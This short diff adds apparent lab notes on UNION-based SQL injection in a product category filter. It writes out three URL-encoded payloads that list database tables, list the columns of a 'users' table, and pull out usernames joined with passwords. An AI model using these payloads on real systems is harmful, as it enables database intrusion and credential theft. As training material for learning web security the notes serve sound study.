@@ -1,0 +1,8 @@
+# if the query returns only a single column and you wanna retrieve multiple values
+you can combine them into a single result.
+
+SQL Injection in Product category filter
+
+Gifts'+UNION+SELECT+NULL,TABLE_NAME+FROM+information_schema.tables-- -> users
+Gifts'+UNION+SELECT+NULL,COLUMN_NAME+FROM+information_schema.columns+WHERE+TABLE_NAME+=+'users'-- -> username, password
+Gifts'+UNION+SELECT+NULL,username+||+' ~ '+||+password+FROM+users-- -> done!
